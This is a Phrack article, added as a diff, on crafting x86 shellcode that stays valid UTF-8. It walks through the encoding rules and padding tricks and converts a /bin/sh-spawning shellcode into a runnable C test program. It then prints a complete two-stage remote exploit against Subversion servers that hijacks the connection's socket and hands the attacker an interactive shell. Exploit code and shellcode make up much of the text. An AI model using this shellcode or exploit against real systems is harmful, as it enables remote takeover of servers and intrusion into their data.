@@ -1,0 +1,893 @@
+
+                           ==Phrack Inc.==
+
+              Volume 0x0b, Issue 0x3e, Phile #0x03 of 0x00
+
+|=--------------[ Writing UTF-8 compatible shellcodes ]-----------------=|
+|=----------------------------------------------------------------------=|
+|=-----------[ Thomas Wana aka. greuff  <greuff@void.at> ]--------------=|
+|=----------------------------------------------------------------------=|
+
+1 - Abstract
+
+2 - What is UTF-8?
+  2.1 - UTF-8 in detail
+  2.2 - Advantages of using UTF-8
+
+3 - The need for UTF-8 compatible shellcodes
+  3.1. - UTF-8 sequences
+    3.1.1 - Possible sequences
+    3.1.2 - UTF-8 shortest form
+    3.1.3 - Valid UTF-8 sequences
+
+4 - Creating the shellcode
+  4.1 - Bytes that come in handy
+    4.1.1 - Continuation bytes
+    4.1.2 - Masking continuation bytes
+    4.1.3 - Chaining instructions
+  4.2 - General design rules
+  4.3 - Testing the code
+
+5 - A working example
+  5.1 - The original shellcode
+  5.2 - UTF-8-ify
+  5.3 - Let's try it out
+  5.4 - A real exploit using these techniques
+
+6. - Considerations
+  6.1 - Automated shellcode transformer
+  6.2 - UTF-8 in XML-files
+
+7 - Greetings, last words
+
+- ----------------------------------------------------------------------------
+
+- ---[ 1. Abstract
+
+This paper deals with the creation of shellcode that is recognized as
+valid by any UTF-8 parser. The problem is not unlike the alphanumeric
+shellcodes problem described by rix in phrack 57 [4], but fortunately
+we have much more characters available, so we can almost always build
+shellcode that is valid UTF-8 and does what we want.
+
+I will show you a brief introduction into UTF-8 and will outline the
+characters available for building shellcodes. You will see that it's
+generally possible to make any shellcode valid UTF-8, but you will have
+to think quite a bit. A working example is provided at the end for
+reference.
+
+- ----------------------------------------------------------------------------
+
+- ---[ 2. What is UTF-8?
+
+For a really great introduction into the topic, I highly suggest reading
+the "UTF-8 and Unicode FAQ" [1] by Markus Kuhn.
+
+UTF-8 is a character encoding, suitable to represent all 2^31 characters
+defined by the UNICODE standard. The really neat thing about UTF-8 is
+that all ASCII characters (the lower codepage in standard encodings like
+ISO-8859-1 etc) are the same in UTF-8 - no conversion needed. That means,
+in the best case, all your config files in /etc and every English text
+document you have on your computer right now are already 100% valid UTF-8.
+
+Unicode characters are written like this: U-0000007F, which stands for 
+"the 128th character in the Unicode character space". You can see that
+with this representation one can easily represent all 2^31 characters that
+the Unicode-standard defines, but it's a waste of space (when you write
+English or western text) and - much more important - makes the transition
+to Unicode very hard (convert all the files you already have). "Hello"
+would thus be encoded like:
+
+   U-00000047 U-00000065 U-0000006C U-0000006C U-0000006F
+
+which is in hex:
+
+   \x47\x00\x00\x00 \x65\x00\x00\x00 \x6C\x00\x00\x00 \x6C\x00\x00\x00
+   \x6F\x00\x00\x00
+
+(for all you little endian friends).
+What a waste of space! 20 bytes for 5 characters... The same text in
+UTF-8:
+
+   "Hello"
+
+:-)
+
+Let's look at the encoding in more detail.
+
+- ---[ 2.1. UTF-8 in detail
+
+UTF-8 can represent any Unicode character in an UTF-8 sequence between
+1-6 bytes. 
+
+As I already mentioned before, the characters in the lower codepage 
+(ASCII-code) are the same in Unicode - they have the character values
+U-00000000 - U-0000007F. You therefore still only need 7 bits to
+represent all possible values. UTF-8 says, if you only need up to 7
+bits for your character, stuff it into one byte and you are fine.
+
+Unicode-characters that have higher values than U-0000007F must be
+mapped to two or more bytes, as shown in the table below:
+
+U-00000000 - U-0000007F: 0xxxxxxx  
+U-00000080 - U-000007FF: 110xxxxx 10xxxxxx 
+U-00000800 - U-0000FFFF: 1110xxxx 10xxxxxx 10xxxxxx
+U-00010000 - U-001FFFFF: 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx
+U-00200000 - U-03FFFFFF: 111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx
+U-04000000 - U-7FFFFFFF: 1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx
+
+Example: U-000000C4 (LATIN CAPITAL LETTER A WITH DIAERESIS)
+
+This character's value is between U-00000080 and U-000007FF, so we
+have to encode it using 2 bytes. 0xC4 is 11000100 binary. UTF-8 fills
+up the places marked 'x' above with these bits, beginning at the
+lowest significant bit.
+
+    110xxxxx 10xxxxxx
++         11   000100
+    -----------------
+    11000011 10000100
+
+which results in 0xC3 0x84 in UTF-8.
+
+Example: U-0000211C (BLACK-LETTER CAPITAL R)
+
+The same here. According to the table above, we need 3 bytes to encode
+this character.
+
+0x211C is 00100001 00011100 binary. Lets fill up the spaces:
+
+    1110xxxx 10xxxxxx 10xxxxxx 10xxxxxx
++         00   100001   000100   011100
+    -----------------------------------
+    11100000 10100001 10000100 10011100
+
+which is 0xE0 0xB1 0x84 0x9C in UTF-8.
+
+I hope you get the point now :-)
+
+- ---[ 2.2. Advantages of using UTF-8
+
+UTF-8 combines the flexibility of Unicode (think of it: no more codepages
+mess!) with the ease-of-use of traditional encodings. Also, the transition
+to complete worldwide UTF-8 support is easy to do, because every plain-
+7-bit-ASCII-file that exists right now (and existed since the 60s) will
+be valid in the future too, without any modifications. Think of all your
+config files!
+
+- ----------------------------------------------------------------------------
+
+- ---] 3. The need for UTF-8 compatible shellcodes
+
+So, since we know now that UTF-8 is going to save our day in the future,
+why would we need shellcodes that are valid UTF-8 texts?
+
+Well, UTF-8 is the default encoding for XML, and since more and more
+protocols start using XML and more and more networking daemons use these
+protocols, the chances to find a vulnerability in such a program
+increases. Additionally, applications start to pass user input around 
+encoded in UTF-8. So sooner or later, you will overflow a buffer with
+UTF-8-data. Now you want that data to be executable AND valid UTF-8.
+
+- ---] 3.1. UTF-8 sequences
+
+Fortunately, the situation is not _that_ desperate, compared to 
+alphanumeric shellcodes. There, we only have a very limited character
+set, and this really limits the instructions available. With UTF-8, we
+have a much bigger character space, but there is one problem: we are
+limited in the _sequence_ of characters. For example, with alphanumeric
+shellcodes we don't care if the sequence is "AAAC" or "CAAA" (except
+for the problem, of course, that the instructions have to make sense :))
+But with UTF-8, for example, 0xBF must not follow 0xBF. Only certain
+bytes may follow other bytes. This is what the UTF-8-shellcode-magic
+is all about.
+
+- ---] 3.1.1. Possible sequences
+
+Let's look into the available "UTF-8-codespace" more closely:
+
+U-00000000 - U-0000007F: 0xxxxxxx = 0 - 127 = 0x00 - 0x7F
+   This is much like the alphanumeric shellcodes - any character
+   can follow any character, so 0x41 0x42 0x43 is no problem, for
+   example.
+
+U-00000080 - U-000007FF: 110xxxxx 10xxxxxx 
+   First byte: 0xC0 - 0xDF
+   Second byte: 0x80 - 0xBF
+   You see the problem here. A valid sequence would be 0xCD 0x80
+   (do you remember that sequence - int $0x80 :)), because the byte
+   following 0xCD must be between 0x80 and 0xBF. An invalid 
+   sequence would be 0xCD 0x41, every UTF-8-parser chokes on 
+   this.
+   
+U-00000800 - U-0000FFFF: 1110xxxx 10xxxxxx 10xxxxxx
+   First byte: 0xE0 - 0xEF
+   Following 2 bytes: 0x80 - 0xBF
+   So, if the sequence starts with 0xE0 to 0xEF, there must be
+   two bytes following between 0x80 and 0xBF. Fortunately we can
+   often use 0x90 here, which is nop. But more on that later.
+
+U-00010000 - U-001FFFFF: 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx
+   First byte: 0xF0 - 0xF7
+   Following 3 bytes: 0x80 - 0xBF
+   You get the point.
+
+U-00200000 - U-03FFFFFF: 111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx
+   First byte: 0xF8 - 0xFB
+   Following 4 bytes: 0x80 - 0xBF
+
+U-04000000 - U-7FFFFFFF: 1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx
+   First byte: 0xFC - 0xFD
+   Following 5 bytes: 0x80 - 0xBF
+
+So we know now what bytes make up UTF-8:
+
+0x00 - 0x7F without problems
+0x80 - 0xBF only as a "continuation byte" in the middle of a sequence
+0xC0 - 0xDF as a start-byte of a two-byte-sequence (1 continuation byte)
+0xE0 - 0xEF as a start-byte of a three-byte-sequence (2 continuation bytes)
+0xF0 - 0xF7 as a start-byte of a four-byte-sequence (3 continuation bytes)
+0xF8 - 0xFB as a start-byte of a five-byte-sequence (4 continuation bytes)
+0xFC - 0xFD as a start-byte of a six-byte-sequence (5 continuation bytes)
+0xFE - 0xFF not usable! (actually, they may be used only once in a UTF-8-
+            text - the sequence 0xFF 0xFE marks the start of such a
+            text)
+
+- ---] 3.1.2. UTF-8 shortest form
+
+Unfortunately (for us), the Corrigendum #1 to the Unicode standard [2]
+specifies that UTF-8-parsers only accept the "UTF-8 shortest form"
+as a valid sequence.
+
+What's the problem here? 
+
+Well, without that rule, we could encode the character U+0000000A (line
+feed) in many different ways:
+
+0x0A - this is the shortest possible form
+0xC0 0x8A
+0xE0 0x80 0x8A
+0xF0 0x80 0x80 0x8A
+0xF8 0x80 0x80 0x80 0x8A
+0xFC 0x80 0x80 0x80 0x80 0x8A
+
+Now that would be a big security problem, if UTF-8 parsers accepted
+_all_ the possible forms. Look at the strcmp routine - it compares two
+strings byte per byte to tell if they are equal or not (that still works
+this way when comparing UTF-8-strings). An attacker could generate a string
+with a longer form than necessary and so bypass string comparison checks,
+for example.
+
+Because of this, UTF-8-parsers are _required_ to only accept the shortest
+possible form of a sequence. This rules out sequences that start with one
+of the following byte patterns:
+
+1100000x (10xxxxxx)
+11100000 100xxxxx (10xxxxxx)
+11110000 1000xxxx (10xxxxxx 10xxxxxx)
+11111000 10000xxx (10xxxxxx 10xxxxxx 10xxxxxx)
+11111100 100000xx (10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx) 
+
+Now certain sequences become invalid, for example 0xC0 0xAF, because
+the resulting UNICODE character is not encoded in its shortest form.
+
+- ---] 3.1.3. Valid UTF-8 sequences
+
+Now that we know all this, we can tell which sequences are valid
+UTF-8:
+
+ Code Points      1st Byte  2nd Byte 3rd Byte 4th Byte
+U+0000..U+007F     00..7F          
+U+0080..U+07FF     C2..DF    80..BF       
+U+0800..U+0FFF     E0        A0..BF   80..BF    
+U+1000..U+FFFF     E1..EF    80..BF   80..BF    
+U+10000..U+3FFFF   F0        90..BF   80..BF   80..BF
+U+40000..U+FFFFF   F1..F3    80..BF   80..BF   80..BF
+U+100000..U+10FFFF F4        80..8F   80..BF   80..BF
+
+Let's look how to build UTF-8-shellcode!
+
+- ----------------------------------------------------------------------------
+
+- ---] 4. Creating the shellcode
+
+Before you start, be sure that you are comfortable creating "standard" 
+shellcode, i.e. shellcode that has no limitations in the instructions 
+available. 
+
+We know which characters we can use and that we have to pay attention to
+the character sequence. Basically, we can transform any shellcode to
+UTF-8 compatible shellcode, but we often need some tricks.
+
+- ---] 4.1. Bytes that come in handy
+
+The biggest problem while building UTF-8-shellcode is that you have
+to get the sequences right.
+
+     "\x31\xc9"          // xor %ecx, %ecx
+     "\x31\xdb"          // xor %ebx, %ebx
+
+We start with \x31. No problem here, \x31 is between \x00 and \x7f,
+so we don't need any more continuation bytes. \xc9 is next. Woops -
+it is between \xc2 and \xdf, so we need a continuation byte. What
+byte is next? \x31 - that is no valid continuation byte (which 
+have to be between \x80 and \xbf). So we have to insert an instruction
+here that doesn't harm our code *and* makes the sequence UTF-8-
+compatible. 
+
+- ---] 4.1.1. Continuation bytes
+
+We are lucky here. The nop instruction (\x90) is the perfect 
+continuation byte and simply does nothing :) (exception: you can't use
+it if it is the first continuation byte in a \xe1-\xef sequence - 
+see the table in 3.1.3). 
+
+So to handle the problem above, we would simply do the following:
+
+     "\x31\xc9"          // xor %ecx, %ecx
+     "\x90"              // nop (UTF-8)
+     "\x31\xdb"          // xor %ebx, %ebx
+     "\x90"              // nop (UTF-8)
+
+(I always mark bytes I inserted because of UTF-8 so I don't accidentally
+optimize them away later when I need to save space)
+
+- ---] 4.1.2. Masking continuation bytes
+
+The other way round, you often have instructions that start with a
+continuation byte, i.e. the first byte of the instruction is between
+\x80 and \xbf:
+
+     "\x8d\x0c\x24"      // lea (%esp,1),%ecx
+
+That means you have to find an instruction that is only one byte long
+and lies between \xc2 and \xdf.
+
+The most suitable one I found here is SALC [2]. This is an *undocumented*
+Intel opcode, but every Intel CPU (and compatible) supports it. The
+funny thing is that even gdb reports an "invalid opcode" there. But it
+works :) The opcode of SALC is \xd6 so it suits our purpose well.
+
+The bad thing is that it has side effects. This instruction modifies
+%al depending on the carry flag (see [3] for details). So always think
+about what happens to your %eax register when you insert this instruction!
+
+Back to the example, the following modification makes the sequence valid
+UTF-8:
+
+     "\xd6"              // salc (UTF-8)
+     "\x8d\x0c\x24"      // lea (%esp,1),%ecx
+
+- ---] 4.1.3. Chaining instructions
+
+If you are lucky, instructions that begin with continuation bytes follow
+instructions that need continuation bytes, so you can chain them together,
+without inserting extra bytes.
+
+You can often safe space this way just by rearranging instructions, so
+think about it when you are short of space.
+
+- ---] 4.2. General design rules
+
+%eax is evil. Try to avoid using it in instructions that use it as a
+parameter because the instruction then often contains \xc0 which is
+invalid in UTF-8. Use something like
+
+    xor %ebx, %ebx
+    push %ebx
+    pop %eax
+
+(pop %eax has an instruction code of its own - and a very UTF-8 friendly
+one, too :)
+
+- ---] 4.3. Testing the code
+
+How can you test the code? Use iconv, it comes with the glibc. You
+basically convert the UTF-8 to UTF-16, and if there are no error
+messages then the string is valid UTF-8. (Why UTF-16? UTF-8 sequences
+can yield character codes well beyond 0xFF, so the conversion would
+fail in the other direction if you would convert to LATIN1 or ASCII.
+Drove me nuts some time ago, because I always thought my UTF-8 was
+wrong...)
+
+First, invalid UTF-8:
+
+greuff@pluto:/tmp$ hexdump -C test
+00000000  31 c9 31 db                                       |1.1.|
+00000004
+greuff@pluto:/tmp$ iconv -f UTF-8 -t UTF-16 test
+ÿþ1iconv: illegal input sequence at position 1
+greuff@pluto:/tmp$
+
+And now valid UTF-8:
+
+greuff@pluto:/tmp$ hexdump -C test
+00000000  31 c9 90 31 db 90                                 |1..1..|
+00000006
+greuff@pluto:/tmp$ iconv -f UTF-8 -t UTF-16 test
+ÿþ1P1Ðgreuff@pluto:/tmp$
+
+- ----------------------------------------------------------------------------
+
+- ---] 5. A working example
+
+Now onto something practical. Let's convert a classical /bin/sh-spawning
+shellcode to UTF-8.
+
+- ---] 5.1. The original shellcode
+
+    "\x31\xd2"                // xor    %edx,%edx
+    "\x52"                    // push   %edx
+    "\x68\x6e\x2f\x73\x68"    // push   $0x68732f6e
+    "\x68\x2f\x2f\x62\x69"    // push   $0x69622f2f
+    "\x89\xe3"                // mov    %esp,%ebx
+    "\x52"                    // push   %edx
+    "\x53"                    // push   %ebx
+    "\x89\xe1"                // mov    %esp,%ecx
+    "\xb8\x0bx\00\x00\x00"    // mov    $0xb,%eax
+    "\xcd\x80"                // int    $0x80
+
+The code simply prepares the stack in the right way, sets some registers
+and jumps into kernel space (int $0x80).
+
+- ---] 5.2. UTF-8-ify
+
+That's an easy example, no big obstacles here. The only obvious problem
+is the "mov $0xb,%eax" instruction. I am quite lazy now, so I'll just
+copy %edx (which is guaranteed to contain 0 at this time) to %eax and 
+increase it 11 times :) 
+
+The new shellcode looks like this (wrapped into a C program so you
+can try it out):
+
+- ----------8<------------8<-------------8<------------8<---------------
+#include <stdio.h>
+
+char shellcode[]=
+    "\x31\xd2"                // xor    %edx,%edx
+    "\x90"                    // nop (UTF-8 - because previous byte was 0xd2)
+    "\x52"                    // push   %edx
+    "\x68\x6e\x2f\x73\x68"    // push   $0x68732f6e
+    "\x68\x2f\x2f\x62\x69"    // push   $0x69622f2f
+    "\xd6"                    // salc (UTF-8 - because next byte is 0x89)
+    "\x89\xe3"                // mov    %esp,%ebx
+    "\x90"                    // nop (UTF-8 - two nops because of 0xe3)
+    "\x90"                    // nop (UTF-8)
+    "\x52"                    // push   %edx
+    "\x53"                    // push   %ebx
+    "\xd6"                    // salc (UTF-8 - because next byte is 0x89)
+    "\x89\xe1"                // mov    %esp,%ecx
+    "\x90"                    // nop (UTF-8 - same here)
+    "\x90"                    // nop (UTF-8)
+    "\x52"                    // push %edx
+    "\x58"                    // pop %eax
+    "\x40"                    // inc %eax
+    "\x40"                    // inc %eax
+    "\x40"                    // inc %eax
+    "\x40"                    // inc %eax
+    "\x40"                    // inc %eax
+    "\x40"                    // inc %eax
+    "\x40"                    // inc %eax
+    "\x40"                    // inc %eax
+    "\x40"                    // inc %eax
+    "\x40"                    // inc %eax
+    "\x40"                    // inc %eax
+    "\xcd\x80"                // int    $0x80
+    ;
+
+void main()
+{
+   int *ret;
+   FILE *fp;
+   fp=fopen("out","w");
+   fwrite(shellcode,strlen(shellcode),1,fp);
+   fclose(fp);
+   ret=(int *)(&ret+2);
+   *ret=(int)shellcode;
+}
+- ----------8<------------8<-------------8<------------8<---------------
+
+As you can see, I used nop's as continuation bytes as well as salc
+to mask out continuation bytes. You'll quickly get an eye for this
+if you do it often.
+
+- ---] 5.3. Let's try it out
+
+greuff@pluto:/tmp$ gcc test.c -o test
+test.c: In function `main':
+test.c:37: warning: return type of `main' is not `int'
+greuff@pluto:/tmp$ ./test
+sh-2.05b$ exit
+exit
+greuff@pluto:/tmp$ hexdump -C out
+00000000  31 d2 90 52 68 6e 2f 73  68 68 2f 2f 62 69 d6 89  |1..Rhn/shh//bi..|
+00000010  e3 90 90 52 53 d6 89 e1  90 90 52 58 40 40 40 40  |...RS.....RX@@@@|
+00000020  40 40 40 40 40 40 40 cd  80                       |@@@@@@@..|
+00000029
+greuff@pluto:/tmp$ iconv -f UTF-8 -t UTF-16 out && echo valid!
+ÿþ1Rhn/shh//bi4RSRX@@@@@@@@@@@@valid!
+greuff@pluto:/tmp$
+
+Hooray! :-)
+
+- ---] 5.4. A real exploit using these techniques
+
+The recent date parsing buffer overflow in Subversion <= 1.0.2 led
+me into researching these problems and writing the following exploit.
+It isn't 100% finished; but it works against svn:// and http:// URLs.
+The first shellcode stage is a hand crafted UTF-8-shellcode, that
+searches for the socket file descriptor and loads a second stage shellcode
+from the exploit and executes it. A real life example showing you that
+these things actually work :)
+
+- ----------8<------------8<-------------8<------------8<---------------
+/*****************************************************************
+ * hoagie_subversion.c
+ *
+ * Remote exploit against Subversion-Servers.
+ *
+ * Author: greuff <greuff@void.at>
+ *
+ * Tested on Subversion 1.0.0 and 0.37
+ *
+ * Algorithm:
+ * This is a two-stage exploit. The first stage overflows a buffer
+ * on the stack and leaves us ~60 bytes of machine code to be
+ * executed. We try to find the socket-fd there and then do a 
+ * read(2) on the socket. The exploit then sends the second stage
+ * loader to the server, which can be of any length (up to the
+ * obvious limits, of course). This second stage loader spawns 
+ * /bin/sh on the server and connects it to the socket-fd.
+ *
+ * Credits:
+ *    void.at
+ *
+ * THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-CONCEPT.
+ * THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY DAMAGE OR
+ * CRIMINAL ACTIVITIES DONE USING THIS PROGRAM.
+ *
+ *****************************************************************/
+
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <stdio.h>
+#include <errno.h>
+#include <string.h>
+#include <fcntl.h>
+#include <netdb.h>
+
+enum protocol { SVN, SVNSSH, HTTP, HTTPS };
+
+char stage1loader[]=
+             // begin socket fd search
+             "\x31\xdb"            // xor %ebx, %ebx
+             "\x90"                // nop (UTF-8)
+             "\x53"                // push %ebx
+             "\x58"                // pop %eax
+             "\x50"                // push %eax
+             "\x5f"                // pop %edi                # %eax = %ebx = %edi = 0
+             "\x2c\x40"            // sub $0x40, %al
+             "\x50"                // push %eax
+             "\x5b"                // pop %ebx
+             "\x50"                // push %eax
+             "\x5a"                // pop %edx                # %ebx = %edx = 0xC0
+             "\x57"                // push %edi
+             "\x57"                // push %edi               # safety-0
+             "\x54"                // push %esp
+             "\x59"                // pop %ecx                # %ecx = pointer to the buffer
+             "\x4b"                // dec %ebx                # beginloop:
+             "\x57"                // push %edi
+             "\x58"                // pop %eax                # clear %eax
+             "\xd6"                // salc (UTF-8)
+             "\xb0\x60"            // movb $0x60, %al
+             "\x2c\x44"            // sub $0x44, %al          # %eax = 0x1C
+             "\xcd\x80"            // int $0x80               # fstat(i, &stat)
+             "\x58"                // pop %eax
+             "\x58"                // pop %eax
+             "\x50"                // push %eax
+             "\x50"                // push %eax
+             "\x38\xd4"            // cmp %dl, %ah            # uppermost 2 bits of st_mode set?
+             "\x90"                // nop (UTF-8)
+             "\x72\xed"            // jb beginloop
+             "\x90"                // nop (UTF-8)
+             "\x90"                // nop (UTF-8)             # %ebx now contains the socket fd
+             // begin read(2)
+             "\x57"                // push %edi
+             "\x58"                // pop %eax                # zero %eax
+             "\x40"                // inc %eax
+             "\x40"                // inc %eax
+             "\x40"                // inc %eax                # %eax=3
+             //"\x54"                // push %esp
+             //"\x59"                // pop %ecx                # %ecx ... address of buffer
+             //"\x54"                // push %edi
+             //"\x5a"                // pop %edx                # %edx ... bufferlen (0xC0)
+             "\xcd\x80"            // int $0x80               # read(2) second stage loader
+             "\x39\xc7"            // cmp %eax, %edi
+             "\x90"                // nop (UTF-8)
+             "\x7f\xf3"            // jg startover
+             "\x90"                // nop (UTF-8)
+             "\x90"                // nop (UTF-8)
+             "\x90"                // nop (UTF-8)
+             "\x54"                // push %esp
+             "\xc3"                // ret                     # execute second stage loader
+             "\x90"                // nop (UTF-8)
+             "\0"    // %ebx still contains the fd we can use in the 2nd stage loader.
+             ;
+
+char stage2loader[]=
+             // dup2 - %ebx contains the fd
+             "\xb8\x3f\x00\x00\x00"   // mov $0x3F, %eax
+             "\xb9\x00\x00\x00\x00"   // mov $0x0, %ecx
+             "\xcd\x80"               // int $0x80
+             "\xb8\x3f\x00\x00\x00"   // mov $0x3F, %eax
+             "\xb9\x01\x00\x00\x00"   // mov $0x1, %ecx
+             "\xcd\x80"               // int $0x80
+             "\xb8\x3f\x00\x00\x00"   // mov $0x3F, %eax
+             "\xb9\x02\x00\x00\x00"   // mov $0x2, %ecx
+             "\xcd\x80"               // int $0x80
+             // start /bin/sh
+             "\x31\xd2"               // xor %edx, %edx
+             "\x52"                   // push %edx
+             "\x68\x6e\x2f\x73\x68"   // push $0x68732f6e
+             "\x68\x2f\x2f\x62\x69"   // push $0x69622f2f
+             "\x89\xe3"               // mov %esp, %ebx
+             "\x52"                   // push %edx
+             "\x53"                   // push %ebx
+             "\x89\xe1"               // mov %esp, %ecx
+             "\xb8\x0b\x00\x00\x00"   // mov $0xb, %eax
+             "\xcd\x80"               // int $0x80
+             "\xb8\x01\x00\x00\x00"   // mov $0x1, %eax
+             "\xcd\x80"               // int %0x80     (exit)
+             ;
+
+int stage2loaderlen=69;
+             
+char requestfmt[]=
+"REPORT %s HTTP/1.1\n"
+"Host: %s\n"
+"User-Agent: SVN/0.37.0 (r8509) neon/0.24.4\n"
+"Content-Length: %d\n"
+"Content-Type: text/xml\n"
+"Connection: close\n\n"
+"%s\n";
+
+char xmlreqfmt[]=
+"<?xml version=\"1.0\" encoding=\"utf-8\"?>"
+"<S:dated-rev-report xmlns:S=\"svn:\" xmlns:D=\"DAV:\">"
+"<D:creationdate>%s%c%c%c%c</D:creationdate>"
+"</S:dated-rev-report>";
+
+int parse_uri(char *uri,enum protocol *proto,char host[1000],int *port,char repos[1000])
+{
+   char *ptr;
+   char bfr[1000];
+   
+   ptr=strstr(uri,"://");
+   if(!ptr) return -1;
+   *ptr=0;
+   snprintf(bfr,sizeof(bfr),"%s",uri);
+   if(!strcmp(bfr,"http"))
+      *proto=HTTP, *port=80;
+   else if(!strcmp(bfr,"svn"))
+      *proto=SVN, *port=3690;
+   else
+   {
+      printf("Unsupported protocol %s\n",bfr);
+      return -1;
+   }
+   uri=ptr+3;
+   if((ptr=strchr(uri,':')))
+   {
+      *ptr=0;
+      snprintf(host,1000,"%s",uri);
+      uri=ptr+1;
+      if((ptr=strchr(uri,'/'))==NULL) return -1;
+      *ptr=0;
+      snprintf(bfr,1000,"%s",uri);
+      *port=(int)strtol(bfr,NULL,10);
+      *ptr='/';
+      uri=ptr;
+   }
+   else if((ptr=strchr(uri,'/')))
+   {
+      *ptr=0;
+      snprintf(host,1000,"%s",uri);
+      *ptr='/';
+      uri=ptr;
+   }
+   snprintf(repos,1000,"%s",uri);
+   return 0;
+}
+
+int exec_sh(int sockfd)
+{
+   char snd[4096],rcv[4096];
+   fd_set rset;
+   while(1)
+   {
+      FD_ZERO(&rset);
+      FD_SET(fileno(stdin),&rset);
+      FD_SET(sockfd,&rset);
+      select(255,&rset,NULL,NULL,NULL);
+      if(FD_ISSET(fileno(stdin),&rset))
+      {
+         memset(snd,0,sizeof(snd));
+         fgets(snd,sizeof(snd),stdin);
+         write(sockfd,snd,strlen(snd));
+      }
+      if(FD_ISSET(sockfd,&rset))
+      {
+         memset(rcv,0,sizeof(rcv));
+         if(read(sockfd,rcv,sizeof(rcv))<=0)
+            exit(0);
+         fputs(rcv,stdout);
+      }
+   }
+}
+
+int main(int argc, char **argv)
+{
+   int sock, port;
+   size_t size;
+   char cmd[1000], reply[1000], buffer[1000];
+   char svdcmdline[1000];
+   char host[1000], repos[1000], *ptr, *caddr;
+   unsigned long addr;
+   struct sockaddr_in sin;
+   struct hostent *he;
+   enum protocol proto;
+
+   /*sock=open("output",O_CREAT|O_TRUNC|O_RDWR,0666);
+   write(sock,stage1loader,strlen(stage1loader));
+   close(sock);
+   return 0;*/
+
+   printf("hoagie_subversion - remote exploit against subversion servers\n"
+          "by greuff@void.at\n\n");
+   if(argc!=3)
+   {
+      printf("Usage: %s serverurl offset\n\n",argv[0]);
+      printf("Examples:\n"
+             "   %s svn://localhost/repository 0x41414141\n"
+             "   %s http://victim.com:6666/svn 0x40414336\n\n",argv[0],argv[0]);
+      printf("The offset is an alphanumeric address (or UTF-8 to be\n"
+             "more precise) of a pop instruction, followed by a ret.\n"
+             "Brute force when in doubt.\n\n");
+      printf("When exploiting against an svn://-url, you can supply a\n"
+             "binary offset too.\n\n");
+      exit(1);
+   }
+
+   // parse the URI
+   snprintf(svdcmdline,sizeof(svdcmdline),"%s",argv[1]);
+   if(parse_uri(argv[1],&proto,host,&port,repos)<0)
+   {
+      printf("URI parse error\n");
+      exit(1);
+   }
+   printf("parse_uri result:\n"
+          "Protocol: %d\n"
+          "Host: %s\n"
+          "Port: %d\n"
+          "Repository: %s\n\n",proto,host,port,repos);
+   addr=strtoul(argv[2],NULL,16);
+   caddr=(char *)&addr;
+   printf("Using offset 0x%02x%02x%02x%02x\n",caddr[3],caddr[2],caddr[1],caddr[0]);
+
+   sock=socket(AF_INET,SOCK_STREAM,0);
+   if(sock<0)
+   {
+      perror("socket");
+      return -1;
+   }
+
+   he=gethostbyname(host);
+   if(he==NULL)
+   {
+      herror("gethostbyname");
+      return -1;
+   }
+   sin.sin_family=AF_INET;
+   sin.sin_port=htons(port);
+   memcpy(&sin.sin_addr.s_addr,he->h_addr,sizeof(he->h_addr));
+   if(connect(sock,(struct sockaddr *)&sin,sizeof(sin))<0)
+   {
+      perror("connect");
+      return -1;
+   }
+
+   if(proto==SVN)
+   {
+      size=read(sock,reply,sizeof(reply));
+      reply[size]=0;
+      printf("Server said: %s\n",reply);
+      snprintf(cmd,sizeof(cmd),"( 2 ( edit-pipeline ) %d:%s ) ",strlen(svdcmdline),svdcmdline);
+      write(sock,cmd,strlen(cmd));
+      size=read(sock,reply,sizeof(reply));
+      reply[size]=0;
+      printf("Server said: %s\n",reply);
+      strcpy(cmd,"( ANONYMOUS ( 0: ) ) ");
+      write(sock,cmd,strlen(cmd));
+      size=read(sock,reply,sizeof(reply));
+      reply[size]=0;
+      printf("Server said: %s\n",reply);
+      snprintf(cmd,sizeof(cmd),"( get-dated-rev ( %d:%s%c%c%c%c ) ) ",strlen(stage1loader)+4,stage1loader,
+            caddr[0],caddr[1],caddr[2],caddr[3]);
+      write(sock,cmd,strlen(cmd));
+      size=read(sock,reply,sizeof(reply));
+      reply[size]=0;
+      printf("Server said: %s\n",reply); 
+   }
+   else if(proto==HTTP)
+   {
+      // preparing the request...
+      snprintf(buffer,sizeof(buffer),xmlreqfmt,stage1loader,
+            caddr[0],caddr[1],caddr[2],caddr[3]);
+      size=strlen(buffer);
+      snprintf(cmd,sizeof(cmd),requestfmt,repos,host,size,buffer);
+
+      // now sending the request, immediately followed by the 2nd stage loader
+      printf("Sending:\n%s",cmd);
+      write(sock,cmd,strlen(cmd));
+      sleep(1);
+      write(sock,stage2loader,stage2loaderlen);
+   }
+
+   // SHELL LOOP
+   printf("Entering shell loop...\n");
+   exec_sh(sock);
+
+   /*sleep(1);
+   close(sock);
+   printf("\nConnecting to the shell...\n");
+   exec_sh(connect_sh()); */
+   return 0;
+}
+- ----------8<------------8<-------------8<------------8<---------------
+
+- ----------------------------------------------------------------------------
+
+- ---] 6. Considerations
+
+Some thoughts about the whole topic.
+
+- ---] 6.1. Automated shellcode transformer
+
+Perhaps it's possible to write an automated shellcode transformer that gets
+a shellcode and outputs the shellcode UTF-8 compatible (similar to rix's
+alphanumeric shellcode compiler [4]), but it would be a challenge. Many
+decisions during the transformation process cannot be automated in my
+opinion. (By the way - alphanumeric shellcode is of course valid UTF-8!
+So if you want to save time and space it's not a problem, just use the 
+alphanumeric shellcode compiler on your shellcode and use that!)
+
+- ---] 6.2. UTF-8 in XML-files
+
+When you write UTF-8 shellcode for the purpose of sending it in an XML-
+document, you'll have to care for a few more things. The bytes \x00 to
+\x08 are forbidden in XML, as well as the obvious characters like '<',
+'>' and so on. Don't forget that when you exploit your favourite XML-
+processing app!
+ 
+- ----------------------------------------------------------------------------
+
+- ---] 7. Greetings, last words
+
+andi@void.at (man, get a nick :))
+soletario (the indoor snowboarder)
+ReAction
+all the other people who often helped me out
+
+- ----------------------------------------------------------------------------
+
